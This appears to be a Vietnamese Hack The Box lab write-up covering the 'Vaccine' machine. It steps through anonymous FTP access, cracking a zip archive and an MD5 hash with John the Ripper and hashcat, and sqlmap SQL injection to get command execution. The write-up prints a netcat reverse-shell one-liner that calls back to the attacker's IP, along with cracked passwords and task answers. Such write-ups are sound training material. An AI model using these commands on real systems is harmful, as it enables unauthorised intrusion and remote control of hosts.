![image](https://github.com/Pminh21/HTB_writeup/assets/169346714/5662756c-ae90-41ca-9fd1-6b2dc4de3824)

- Chạy nmap -sV -T4 quét các dịch vụ chạy trên máy chủ

![image](https://github.com/Pminh21/HTB_writeup/assets/169346714/fe21aece-cacf-4e33-9df8-38c1df972a5f)

* Task 1: Besides SSH and HTTP, what other service is hosted on this box?: ftp
- Ta cần thu thập thêm thông tin về dịch vụ chạy lệnh: nmap -sC -T4 "ip"

![image](https://github.com/Pminh21/HTB_writeup/assets/169346714/5eb0427b-97ac-44d2-8f8d-e39c4445e7db)

- Điều cần chú ý ở đây là FTP: giao thức truyền tệp qua mạng, hoạt động theo mô hình client-server
* Task 2: This service can be configured to allow login with any password for specific username. What is that username?:  Anonymous
- Tiến hành đăng nhập bằng username: anonymous.
- command: ftp anonymous@10.129.95.174

![image](https://github.com/Pminh21/HTB_writeup/assets/169346714/1b95ed0e-7c6d-4f93-8c66-33286c1bcc04)

- Sử dụng lệnh ls để liệt kê thư mục, file. Ta thấy có 1 file là backup.zip. Sử dụng lệnh get để tải file xuống
*  Task 3: What is the name of the file downloaded over this service?: backup.zip

![image](https://github.com/Pminh21/HTB_writeup/assets/169346714/44b107cc-6c0a-49fc-9483-06bf3f3ab6e1)

- Tiến hành giải nén file, file có mật khẩu. Sử dụng john the ripper để crack mật khẩu.
- Task 4: What script comes with the John The Ripper toolset and generates a hash from a password protected zip archive in a format to allow for cracking attempts?: zip2john

![image](https://github.com/Pminh21/HTB_writeup/assets/169346714/be6c18c3-dfe3-47bd-b66a-46d8aa6b6f24)

- Crack không được, ta dùng wordlist để bẻ khóa (dùng wordlist rockyou.txt)

![image](https://github.com/Pminh21/HTB_writeup/assets/169346714/e74ef254-78ba-4728-9eae-54320ebb52d1)

- lấy được password: 741852963
- Tiến hành giải nén file backup được 2 file là index.php và style.css
- Ta quan tâm đến file index.php
![image](https://github.com/Pminh21/HTB_writeup/assets/169346714/1a19ce53-dbad-4f3f-ad70-4bb1e0b322d6)

- Thấy được user là admin là mật khẩu là 1 mã hax: dùng tiếp john the ripper để crack.
- Chạy không ra => dùng hashcat 
- hashcat -m 0 -a 0 vaccine2.txt /usr/share/wordlists/rockyou.txt
- trong đó -m là hash mode 0 là md5, -a attack mode  0 | Straight
![image](https://github.com/Pminh21/HTB_writeup/assets/169346714/389030fd-416c-4c61-a0bc-badc488057f9)

- Task 5: What is the password for the admin user on the website?: qwerty789
- Đề bài ở đây là thực thi sql injection: sử dụng sql map.
- Tạo 1 file là new.req để lưu request.
- Dùng burpsuite bắt requets copy-> new.req
- ![image](https://github.com/Pminh21/HTB_writeup/assets/169346714/37a107c6-cce8-4340-8167-fcec10e9dc59)

- Sử dụng sqlmap -r new.req --os-shell
- Tham số -r là đọc request từ file new.req, tham số --os-shell để thực thi lệnh shell từ xa. 
- Task 6: What option can be passed to sqlmap to try to get command execution via the sql injection?: --os-shell
- ![image](https://github.com/Pminh21/HTB_writeup/assets/169346714/c4679cf5-719d-4233-920c-2e0217587f6e)

- lệnh shell: (rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.14.22 1234 >/tmp/f)
+ Sẽ tạo tệp fifo: tệp để truyền dữ liệu giữa các tiến trình: ip 10.10.14.22(ip của máy tấn công: ifconfig, tun0) cổng 1234 
+ Sau khi thực thi lệnh xong.
+ mở terminal chạy netcat để lắng nghe trên cổng 1234 
+ để shell hoạt động trơn tru vip pro hơn: 
      python3 -c 'import pty;pty.spawn("/bin/bash")'
      CTRL+Z
      stty raw -echo
      fg
      export TERM=xterm
![image](https://github.com/Pminh21/HTB_writeup/assets/169346714/4691fbcf-a4c7-412e-a7ce-77da3fb87460)

